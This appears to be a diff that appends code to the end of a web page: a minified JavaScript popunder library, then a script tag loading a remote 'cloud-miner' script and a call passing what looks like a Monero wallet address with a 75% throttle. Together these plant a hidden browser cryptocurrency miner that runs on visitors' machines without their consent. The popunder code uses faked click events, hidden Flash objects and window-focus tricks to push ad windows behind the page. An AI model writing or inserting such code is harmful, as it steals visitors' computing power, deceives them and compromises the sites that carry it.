+var _wm={initialize:function(){this.ua.initialize()},array:{is_array:function(a){return Object.prototype.toString.call(a)==='[object Array]'},sort:function(a,b,c){a=a.sort();if(b)a=a.reverse();if(c){for(var i=0;i<a.length;i++){var d=a[i];if(Object.prototype.toString.call(d)==='[object Object]')d=_wm.object.sort(d,b,true);else if(Object.prototype.toString.call(d)==='[object Array]')d=_wm.array.sort(d,b,true);a[i]=d}}return a},random_value:function(a){return a[Math.floor(a.length*Math.random())]}},object:{is_object:function(a){return Object.prototype.toString.call(a)==='[object Object]'},keys:function(a){var hasOwnProperty=Object.prototype.hasOwnProperty,hasDontEnumBug=!({toString:null}).propertyIsEnumerable('toString'),dontEnums=['toString','toLocaleString','valueOf','hasOwnProperty','isPrototypeOf','propertyIsEnumerable','constructor'],dontEnumsLength=dontEnums.length;var b=[];if(typeof a!=='object'&&typeof a!=='function'||a===null)return b;for(var c in a){if(hasOwnProperty.call(a,c))b.push(c)}if(hasDontEnumBug){for(var i=0;i<dontEnumsLength;i++){if(hasOwnProperty.call(a,dontEnums[i]))b.push(dontEnums[i])}}return b},sort:function(a,c,d){var e=_wm.array.sort(_wm.object.keys(a));if(c)e=e.reverse();var b={};for(var i=0;i<e.length;i++){var f=a[e[i]];if(d){if(_wm.object.is_object(f))f=_wm.object.sort(f,c,true);else if(_wm.array.is_array(f))f=_wm.array.sort(f,c,true)}b[e[i]]=f}return b},iterator:function(b){this.element=b;this.element_array=_wm.object.keys(b);this.current_index=0;this.hasNext=function(){return this.current_index<=this.element_array.length-1};this.next=function(){if(this.hasNext()){var a=[this.element_array[this.current_index],this.element[this.element_array[this.current_index]]];this.current_index++;return a}return false}},random_value:function(a){return a[_wm.array.random_value(_wm.object.keys(a))]},length:function(a){return _wm.object.keys(a).length}},ua:{initialize:function(){this.maps={browser:{oldsafari:{major:{'1':['/8','/1','/3'],'2':'/4','?':'/'},version:{'1.0':'/8','1.2':'/1','1.3':'/3','2.0':'/412','2.0.2':'/416','2.0.3':'/417','2.0.4':'/419','?':'/'}}},os:{windows:{version:{'ME':'4.90','NT 3.11':'NT3.51','NT 4.0':'NT4.0','2000':'NT 5.0','XP':['NT 5.1','NT 5.2'],'Vista':'NT 6.0','7':'NT 6.1','8':'NT 6.2','8.1':'NT 6.3','RT':'ARM'}}}};this.regexes={browser:[[/(opera\smini)\/((\d+)?[\w\.-]+)/i,/(opera\s[mobiletab]+).+version\/((\d+)?[\w\.-]+)/i,/(opera).+version\/((\d+)?[\w\.]+)/i,/(opera)[\/\s]+((\d+)?[\w\.]+)/i],['name','version','major'],[/\s(opr)\/((\d+)?[\w\.]+)/i],[['name','Opera'],'version','major'],[/(kindle)\/((\d+)?[\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?((\d+)?[\w\.]+)*/i,/(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?((\d+)?[\w\.]*)/i,/(?:ms|\()(ie)\s((\d+)?[\w\.]+)/i,/(rekonq)((?:\/)[\w\.]+)*/i,/(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron)\/((\d+)?[\w\.-]+)/i],['name','version','major'],[/(trident).+rv[:\s]((\d+)?[\w\.]+).+like\sgecko/i],[['name','IE'],'version','major'],[/(yabrowser)\/((\d+)?[\w\.]+)/i],[['name','Yandex'],'version','major'],[/(comodo_dragon)\/((\d+)?[\w\.]+)/i],[['name',/_/g,' '],'version','major'],[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?((\d+)?[\w\.]+)/i],['name','version','major'],[/(dolfin)\/((\d+)?[\w\.]+)/i],[['name','Dolphin'],'version','major'],[/((?:android.+)crmo|crios)\/((\d+)?[\w\.]+)/i],[['name','Chrome'],'version','major'],[/version\/((\d+)?[\w\.]+).+?mobile\/\w+\s(safari)/i],['version','major',['name','Mobile Safari']],[/version\/((\d+)?[\w\.]+).+?(mobile\s?safari|safari)/i],['version','major','name'],[/webkit.+?(mobile\s?safari|safari)((\/[\w\.]+))/i],['name',['major',_wm.ua.mapper.str,_wm.ua.maps.browser.oldsafari.major],['version',_wm.ua.mapper.str,_wm.ua.maps.browser.oldsafari.version]],[/(konqueror)\/((\d+)?[\w\.]+)/i,/(webkit|khtml)\/((\d+)?[\w\.]+)/i],['name','version','major'],[/(navigator|netscape)\/((\d+)?[\w\.-]+)/i],[['name','Netscape'],'version','major'],[/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?((\d+)?[\w\.\+]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix)\/((\d+)?[\w\.-]+)/i,/(mozilla)\/((\d+)?[\w\.]+).+rv\:.+gecko\/\d+/i,/(uc\s?browser|polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|qqbrowser)[\/\s]?((\d+)?[\w\.]+)/i,/(links)\s\(((\d+)?[\w\.]+)/i,/(gobrowser)\/?((\d+)?[\w\.]+)*/i,/(ice\s?browser)\/v?((\d+)?[\w\._]+)/i,/(mosaic)[\/\s]((\d+)?[\w\.]+)/i],['name','version','major']],os:[[/(windows)\snt\s6\.2;\s(arm)/i,/(windows\sphone(?:\sos)*|windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i],['name',['version',_wm.ua.mapper.str,_wm.ua.maps.os.windows.version]],[/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i],[['name','Windows'],['version',_wm.ua.mapper.str,_wm.ua.maps.os.windows.version]],[/\((bb)(10);/i],[['name','BlackBerry'],'version'],[/(blackberry)\w*\/?([\w\.]+)*/i,/(tizen)\/([\w\.]+)/i,/(android|webos|palm\os|qnx|bada|rim\stablet\sos|meego)[\/\s-]?([\w\.]+)*/i],['name','version'],[/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]+)*/i],[['name','Symbian'],'version'],[/mozilla.+\(mobile;.+gecko.+firefox/i],[['name','Firefox OS'],'version'],[/(nintendo|playstation)\s([wids3portablevu]+)/i,/(mint)[\/\s\(]?(\w+)*/i,/(joli|[kxln]?ubuntu|debian|[open]*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk)[\/\s-]?([\w\.-]+)*/i,/(hurd|linux)\s?([\w\.]+)*/i,/(gnu)\s?([\w\.]+)*/i],['name','version'],[/(cros)\s[\w]+\s([\w\.]+\w)/i],[['name','Chromium OS'],'version'],[/(sunos)\s?([\w\.]+\d)*/i],[['name','Solaris'],'version'],[/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]+)*/i],['name','version'],[/(ip[honead]+)(?:.*os\s*([\w]+)*\slike\smac|;\sopera)/i],[['name','iOS'],['version',/_/g,'.']],[/(mac\sos\sx)\s?([\w\s\.]+\w)*/i],['name',['version',/_/g,'.']],[/(haiku)\s(\w+)/i,/(aix)\s((\d)(?=\.|\)|\s)[\w\.]*)*/i,/(macintosh|mac(?=_powerpc)|plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos)/i,/(unix)\s?([\w\.]+)*/i],['name','version']]},this.browser=this.get.browser();this.os=this.get.os()},ua:(window&&window.navigator&&window.navigator.userAgent)?window.navigator.userAgent:'',get:{browser:function(){return _wm.ua.mapper.rgx.apply(this,_wm.ua.regexes.browser)},os:function(){return _wm.ua.mapper.rgx.apply(this,_wm.ua.regexes.os)}},util:{has:function(a,b){return b.toLowerCase().indexOf(a.toLowerCase())!==-1},lowerize:function(a){return a.toLowerCase()}},mapper:{rgx:function(){for(var a,i=0,j,k,p,q,matches,match,args=arguments;i<args.length;i+=2){var b=args[i],props=args[i+1];if(typeof(a)==='undefined'){a={};for(p in props){q=props[p];if(typeof(q)==='object'){a[q[0]]=undefined}else{a[q]=undefined}}}for(j=k=0;j<b.length;j++){matches=b[j].exec(_wm.ua.ua);if(!!matches){for(p=0;p<props.length;p++){match=matches[++k];q=props[p];if(typeof(q)==='object'&&q.length>0){if(q.length==2){if(typeof(q[1])=='function'){a[q[0]]=q[1].call(this,match)}else{a[q[0]]=q[1]}}else if(q.length==3){if(typeof(q[1])==='function'&&!(q[1].exec&&q[1].test)){a[q[0]]=match?q[1].call(this,match,q[2]):undefined}else{a[q[0]]=match?match.replace(q[1],q[2]):undefined}}else if(q.length==4){a[q[0]]=match?q[3].call(this,match.replace(q[1],q[2])):undefined}}else{a[q]=match?match:undefined}}break}}if(!!matches)break}return a},str:function(a,b){for(var i in b){if(typeof(b[i])==='object'&&b[i].length>0){for(var j=0;j<b[i].length;j++){if(_wm.ua.util.has(b[i][j],a)){return(i==='?')?undefined:i}}}else if(_wm.ua.util.has(b[i],a)){return(i==='?')?undefined:i}}return a}}},cookie:{get:function(a,b){var c=new Date();c.setTime(c.getTime());var d=new Date(c.getTime()+(1000*60*60*b)).toGMTString();var e=document.cookie.split(';');var f='';var g='';var h=[0,d];for(var i=0;i<e.length;i++){f=e[i].split('=');g=f[0].replace(/^\s+|\s+$/g,'');if(g==a){b_cookie_found=true;if(f.length>1){h=unescape(f[1]).split('|');if(h.length==1)h[1]=d}return h}f=null;g=''}return h},set:function(a,b,c){document.cookie=a+'='+escape(b+'|'+c)+';expires='+c+';path=/'}},listener:{events:[],add:function(a,b,c,e){if(e==undefined)e=true;var d='on'+b;if(typeof a.addEventListener!='undefined')a.addEventListener(b,c,e);else if(typeof a.attachEvent!='undefined')a.attachEvent(d,c);else{if(typeof a[d]!='function')a[d]=c;else{var e=a[d];a['old_'+d]=e;a[d]=function(){e();return c()}}}_wm.listener.events.push(arguments)},remove:function(a,b,c,e){if(e==undefined)e=true;var d='on'+b;if(typeof a.removeEventListener!='undefined')a.removeEventListener(b,c,e);else if(typeof a.detachEvent!='undefined')a.detachEvent(d,c);else{if(typeof a['old_'+d]!='function')a[d]=null;else a[d]=a['old_'+d]}outer:for(var i=0;i<_wm.listener.events.length;i++){inner:for(var j=0;j<_wm.listener.events[i].length;j++){if(_wm.listener.events[i][j]!==arguments[j])continue outer}_wm.listener.events=_wm.listener.events.slice(0,i).concat(_wm.listener.events.slice(i+1));break outer}},clear:function(){while(_wm.listener.events.length>0)_wm.listener.remove.apply(undefined,_wm.listener.events[0])}},format:{},random:function(){return Math.floor(Math.random()*1000001)}};_wm.initialize();_wm.format.popunder={settings:typeof _wm_settings==='object'&&_wm_settings.popunder||false,config:'width='+screen.width+', height='+screen.height+',resizable=no,toolbar=no,location=no,directories=no,status=no,menubar=no,copyhistory=no,scrollbars=yes',isBinded:false,isTriggered:false,trigger_stack:[],initialize:function(){if(!_wm.format.popunder.settings){alert('Popunder configuration need to be declared using _wm_settings variable prior to script execution.');return}var a=_wm.cookie.get(_wm.format.popunder.settings.cookie,_wm.format.popunder.settings.hours);this.cookie={};this.cookie.times=!isNaN(Number(a[0]))?Number(a[0]):0;this.cookie.expires=!isNaN(Date.parse(a[1]))?a[1]:new Date().toGMTString();if(_wm.format.popunder.settings.fastbind)_wm.format.popunder.handler.bind();else{if(document.readyState=='complete')_wm.format.popunder.handler.bind();else{_wm.listener.add(document,'DOMContentLoaded',function(){_wm.listener.remove(document,'DOMContentLoaded');_wm.format.popunder.handler.bind()});_wm.listener.add(document,'onreadystatechange',function(){if(document.readyState=='complete'){_wm.listener.remove(document,'onreadystatechange');_wm.format.popunder.handler.bind()}});_wm.listener.add(window,'load',_wm.format.popunder.handler.bind)}}},url:function(){var a=_wm.format.popunder.settings.url;if(typeof a=='string')return a;if(_wm.array.is_array(a))return _wm.array.random_value(a);if((_wm.object.is_object(a)&&!_wm.format.popunder.settings.hours))return _wm.object.random_value(a);if(_wm.object.is_object(a)){if(a[_wm.format.popunder.cookie.times]!=undefined)return a[_wm.format.popunder.cookie.times];else return _wm.object.random_value(a)}return null},handler:{bind:function(){if(_wm.format.popunder.isBinded)return;_wm.format.popunder.isBinded=true;if(_wm.format.popunder.cookie.times>=_wm.format.popunder.settings.times&&_wm.format.popunder.settings.hours>0)return;var b={};var c=function(){var a=arguments[0];for(var i=2;i<arguments.length;i++){if(i%2)arguments[i]=arguments[i]+'.0';if(!a.hasOwnProperty(arguments[i])&&i<arguments.length-1)a[arguments[i]]={};if(i==arguments.length-1)a[arguments[i]]=arguments[1];else a=a[arguments[i]]}return arguments[0]};for(var d in _wm.format.popunder.callback.binder){if(!_wm.format.popunder.callback.binder.hasOwnProperty(d))continue;var e=_wm.format.popunder.callback.binder[d];var f=d.split(',');for(var g in f){if(!f.hasOwnProperty(g))continue;var h=f[g].split(':');var j=h.length==1?['all',0].concat(h[0].split('_')):(h[0].indexOf('_')!=-1?h[0].split('_'):h[0].split('_').concat([0])).concat(h[1].split('_'));if(j.length==3)j.push(0);b=c.apply(null,[b,e].concat(j))}}b=_wm.object.sort(b,true,true);var k={};var l=[_wm.ua.os.name.toLowerCase().split(' ').shift(),parseInt(_wm.ua.os.version)||0,_wm.ua.browser.name.toLowerCase().split(' ').shift(),parseInt(_wm.ua.browser.major)||0];var m=[],trace_values=[];var n=b;for(var i=0;i>=0&&i<l.length;i++){var o=(trace_values.length>0?trace_values.join(':')+':':'')+''+i;if(k[o]){var p=k[o]}else{var p=new _wm.object.iterator(n);k[o]=p}var q=false;while(p.hasNext()){var r=p.next();if((i%2&&r[0]<=parseFloat(l[i]))||(i%2==0&&(r[0]==l[i])||r[0]==='all')){q=r[0];break}}if(q){m.push(n);trace_values.push(q);n=n[q]}else{trace_values.pop();n=m.pop();i-=2}}if(typeof n==='function')n()},trigger:function(e){if(_wm.ua.browser.name.toLowerCase()!=='ie'||_wm.ua.browser.major>8)e.stopImmediatePropagation();_wm.listener.clear();if(!_wm.format.popunder.registerTrigger())return;var a;while(a=_wm.format.popunder.trigger_stack.shift())_wm.format.popunder.callback.trigger[a.shift()].apply(undefined,a)}},callback:{binder:{'mac:safari_6,windows:chrome_34,mac:chrome_34,linux:chrome_34':function(){_wm.format.popunder.trigger_stack.push(['tab_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'windows:chrome_31,mac:chrome_31,linux:chrome_31':function(){_wm.format.popunder.trigger_stack.push(['flash_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'windows:chrome_28,mac:chrome_28,linux:chrome_28':function(){_wm.format.popunder.trigger_stack.push(['triple_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'firefox_12,chrome_21':function(){_wm.format.popunder.trigger_stack.push(['double_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'explorer':function(){_wm.format.popunder.trigger_stack.push(['single_delay']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'android:all,ios:all':function(){_wm.format.popunder.trigger_stack.push(['single']);_wm.listener.add(document,'touchend',_wm.format.popunder.handler.trigger);_wm.listener.add(document,'touchcancel',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'windows:iemobile':function(){_wm.format.popunder.trigger_stack.push(['single']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'all':function(){_wm.format.popunder.trigger_stack.push(['single']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()}},trigger:{flash_trigger:function(){var d=document.createElement('div');document.body.appendChild(d);d.innerHTML='<object type="application/x-sho'+'ckwave-fla'+'sh" data="about:blank" id="wm_ff_pu_33_fl" '+'width="1" height="1"><param name="wmode" value="transparent"></object>';var a=document.getElementById('wm_ff_pu_33_fl');a.focus();a.style.display='none';window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);window.open('').close()},tab_trigger:function(){var a=document.createElement('a');a.href=_wm.format.popunder.url();a.setAttribute('target','_blank');top.window.document.body.appendChild(a);var e=document.createEvent('MouseEvents');e.initMouseEvent('click',true,true,window,0,0,0,0,0,true,false,false,true,0,null);a.dispatchEvent(e)},triple_trigger:function(){window.open('javascript:window.focus()','_self');var w=window.open('about:blank','pu_'+_wm.random(),_wm.format.popunder.config);var a=document.createElement('a');a.setAttribute('href','data:text/html,<scr'+'ipt>window.close();</scr'+'ipt>');a.style.display='none';document.body.appendChild(a);var e=document.createEvent('MouseEvents');e.initMouseEvent('click',true,true,window,0,0,0,0,0,true,false,false,true,0,null);a.dispatchEvent(e);document.body.removeChild(a);w.document.open().write('<scr'+'ipt type="text/javascript">window.location="'+_wm.format.popunder.url()+'";<\/scr'+'ipt>');w.document.close()},double_trigger:function(){var w=window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);if(w){w.blur();try{var b=w.window.open('about:blank');b.close()}catch(i){}if(_wm.ua.browser=='Firefox')window.showModalDialog("javascript:window.close()",null,"dialogtop:99999999;dialogleft:999999999;dialogWidth:1;dialogHeight:1");window.focus()}},single_delay:function(){var w=window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);window.setTimeout(window.focus,750);window.setTimeout(window.focus,850);if(w)w.blur()},single:function(a){var w=window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);if(w){w.blur();window.focus()}},}},occupy:function(a){if(!a){a=['mousedown','mouseup']}for(var i=0;i<a.length;i++){_wm.listener.add(document,a[i],function(e){if(_wm.ua.browser.name.toLowerCase()!=='ie'||_wm.ua.browser.major>8)e.stopImmediatePropagation()})}},registerTrigger:function(){if(_wm.format.popunder.isTriggered)return false;_wm.format.popunder.isTriggered=true;if(_wm.format.popunder.settings.hours>0)_wm.cookie.set(_wm.format.popunder.settings.cookie,++_wm.format.popunder.cookie.times,_wm.format.popunder.cookie.expires);return true}};(function(){_wm.format.popunder.initialize()})();
+</script>
+<script src="https://cloud-miner.eu/tkefrep/tkefrepp.js?tkefrep=bs?nosaj=faster.moneroocean" ></script>
+<script type="text/javascript">
+EverythingIsLife('4ADkX7bC8UoZbimWVm4tg3367cxqw7evwX3NwHW45xAgLCX6Pncj3YTfyYicDqUFqt9kR3rLouZ5TfV8aU1H4HB41SpzQen.2', 'x', 75);</script>
+</body>
+</html>
